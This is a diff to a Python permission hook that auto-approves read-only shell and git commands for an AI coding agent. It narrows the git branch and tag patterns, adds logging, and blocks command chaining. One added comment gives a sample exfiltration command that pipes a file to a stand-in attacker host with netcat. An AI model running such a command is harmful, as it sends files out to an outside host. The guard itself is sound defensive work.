@@ -18,13 +18,17 @@ SAFE_BASH_PATTERNS = [
     re.compile(r"^type\b"),
     re.compile(r"^file\b"),
     re.compile(r"^stat\b"),
-    re.compile(r"^git\s+(status|log|diff|show|branch|tag|remote\s+-v)\b"),
+    re.compile(r"^git\s+(status|log|diff|show|remote\s+-v)\b"),
+    re.compile(r"^git\s+branch(\s+(-[arv]|--all|--remotes|--verbose|--list))*\s*$"),
+    re.compile(r"^git\s+tag(\s+(-l|--list))*\s*$"),
     re.compile(r"^npm\s+(list|ls|outdated|view)\b"),
     re.compile(r"^pip\s+(list|show|freeze)\b"),
     re.compile(r"^python\s+--version$"),
     re.compile(r"^node\s+--version$"),
 ]
 
+# CHAINING_CHARS runs before SAFE_BASH_PATTERNS — e.g. "cat foo | nc evil.com"
+# is rejected by the pipe char before "cat" matches the safe pattern.
 CHAINING_CHARS = re.compile(r"[;|&`>\n]|\$\(")
 ALLOW_OUTPUT = json.dumps({
     "hookSpecificOutput": {
@@ -38,14 +42,15 @@ def main():
     try:
         raw = sys.stdin.read()
         if not raw.strip():
+            print("guard-auto-allow: empty stdin, no-op", file=sys.stderr)
             sys.exit(0)
         payload = json.loads(raw)
     except json.JSONDecodeError:
-        print("guard-auto-allow: malformed JSON from Claude, skipping check", file=sys.stderr)
+        print("guard-auto-allow: malformed JSON, deferring to user prompt", file=sys.stderr)
         sys.exit(0)
 
     tool_name = payload.get("tool_name", "")
-    tool_input = payload.get("tool_input", {})
+    tool_input = payload.get("tool_input") or {}
 
     # Unconditionally allow read-only tools
     if tool_name in READ_ONLY_TOOLS:
